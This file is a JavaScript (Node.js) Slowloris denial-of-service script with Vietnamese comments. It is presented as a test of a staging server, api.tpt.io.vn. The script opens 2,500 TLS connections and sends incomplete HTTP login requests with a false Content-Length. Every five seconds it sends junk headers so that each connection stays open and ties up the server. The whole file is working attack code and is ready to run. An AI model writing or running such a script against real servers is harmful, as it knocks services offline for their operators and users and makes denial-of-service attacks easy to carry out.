const net = require('net');
const tls = require('tls');

// CẤU HÌNH KIỂM THỬ
// - Để test local: HOST = 'localhost', PORT = 3000, IS_HTTPS = false
// - Để test staging: HOST = 'api.tpt.io.vn', PORT = 443, IS_HTTPS = true
const HOST = 'api.tpt.io.vn';
const PORT = 443;
const IS_HTTPS = true;
const CONNECTIONS = 2500; // Số lượng connection giữ treo

const clients = [];

console.log(
  `[Slowloris] Bắt đầu tấn công vào ${IS_HTTPS ? 'https' : 'http'}://${HOST}:${PORT}...`,
);

for (let i = 0; i < CONNECTIONS; i++) {
  setTimeout(() => {
    let client;
    const options = { host: HOST, port: PORT, rejectUnauthorized: false };

    if (IS_HTTPS) {
      client = tls.connect(PORT, HOST, options, () => {
        setupClient(client, i);
      });
    } else {
      client = net.connect({ host: HOST, port: PORT }, () => {
        setupClient(client, i);
      });
    }

    client.on('error', (err) => {
      // console.error(`[Connection #${index} Error]`, err.message);
    });

    client.on('close', () => {
      // console.log(`[Connection #${index}] Bị đóng bởi server.`);
    });

    clients.push(client);
  }, i * 50); // Bắt đầu kết nối tuần tự cách nhau 50ms để không nghẽn client
}

function setupClient(client, index) {
  console.log(`[Slowloris] Kết nối #${index} thành công.`);

  // Gửi HTTP header chưa hoàn tất (thiếu ký tự xuống dòng cuối \r\n\r\n)
  client.write('GET /api/v1/auth/login HTTP/1.1\r\n');
  client.write(`Host: ${HOST}\r\n`);
  client.write('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n');
  client.write('Content-Length: 42\r\n'); // Khai báo content-length nhưng không gửi body để server đợi

  // Gửi định kỳ header rác để reset keep-alive timer của web server
  const interval = setInterval(() => {
    if (!client.destroyed) {
      client.write(`X-Trash-Header-${index}: value\r\n`);
    } else {
      clearInterval(interval);
    }
  }, 5000);
}

process.on('SIGINT', () => {
  console.log('\n[Slowloris] Đang đóng toàn bộ kết nối...');
  clients.forEach((c) => {
    if (!c.destroyed) c.destroy();
  });
  process.exit();
});
